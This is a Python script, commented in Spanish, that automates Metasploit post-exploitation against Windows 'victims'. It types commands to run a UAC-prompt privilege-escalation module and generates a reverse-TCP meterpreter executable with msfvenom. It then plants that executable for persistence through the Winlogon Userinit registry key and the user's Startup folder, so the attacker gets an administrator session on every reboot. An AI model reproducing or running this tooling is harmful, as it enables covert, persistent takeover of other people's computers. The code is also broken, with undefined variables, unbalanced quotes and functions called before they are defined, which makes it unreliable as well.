import pyautogui

path_payload_pers = new_path_pers + "-persistencia.exe"
new_path_pers = path_payloads.replace("/", "-")



post_elec = input("""

1: escalada privilegios win /metod ask/
2: 



if post_elec == 1:

   sessions = input("""
  
   escriba la session meterpreter

    >  """)


   auto_ask()


   def auto_ask():
       pyautogui.write("use exploit-windows-local-ask")
       pyautogui.press("ENTER")
       pyautogui.write("set sessions " + sessions +")
       pyautogui.press("ENTER")
       pyautogui.write("exploit")
       pyautogui.press("ENTER")
       clearScr()
       print("Espere a que la victima haga acepte la ventana flotante")

if post_elec == 2:
   
   sessions = input("""
  
   escriba la session meterpreter

    >  """)
   
   
   windows_ip = input("""
   
   Introduzca su IP
   
   >  """)
    
    
   Introduzca un puerto {ex: 4444}
   
   >   """)
   
   
   os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o path_payloads/persistencia.exe')
     
   auto_pers_sys32()
   
   def auto_pers_sys32():
       pyautogui.write("set sessions " + sessions +")
       pyautogui.press("ENTER")
       pyautogui.write("cd -windows-system32")
       pyautogui.press("ENTER")
       pyautogui.write("upload "+ path_payload_pers")
       pyautogui.press("ENTER")
       pyautogui.write("shell")
       pyautogui.press("ENTER")
       pyautogui.write("reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -v Userinit -d "Userinit.exe, persistencia.exe -f")
       clearScr()
       print("Ahora cuando la vicima reinicie o encienda el dispositivo obtendrá una sesion meterpreter /administrador/")
       print("""
       
       PUEDE DESPLEGAR UN LISTENER EN EL PUERTO "+ puerto +", {la persistencia se conecta por dicho puerto} """)

if post_elec == 3:

   windows_ip = input("""
   
   Introduzca su IP
   
   >  """)
    
   puerto = input("""
  
   Introduzca un puerto {ex: 4444}
   
   >   """)
   
       
   os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o path_payloads/persistencia.exe')
   
   auto_pers_startup()
   
   def auto_pers_startup
       pyautogui.write("sessions " + sessions +"")
       pyautogui.press("ENTER")
       pyautogui.write("cd C:\Users\practicas.ist\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
       pyautogui.press("ENTER")
       pyautogui.write("upload " + path_payload_pers +")
       print("CADA VEZ QUE EL USUARIO INICIE SESION RECIBIRÁ UNA SESION METERPRETER")
       print("""
       
       PUEDE DESPLEGAR UN LISTENER EN EL PUERTO "+ puerto +", {la persistencia se conecta por dicho puerto} """)
      
      
      
      
      
      
      
      
      
      
      
      
       pyautogui.press("ENTER")
       pyautogui.write("")
       pyautogui.press("ENTER")
       pyautogui.write("")
       pyautogui.press("ENTER")
       pyautogui.write("")
       pyautogui.press("ENTER")
       pyautogui.write("")


    
    
    
  
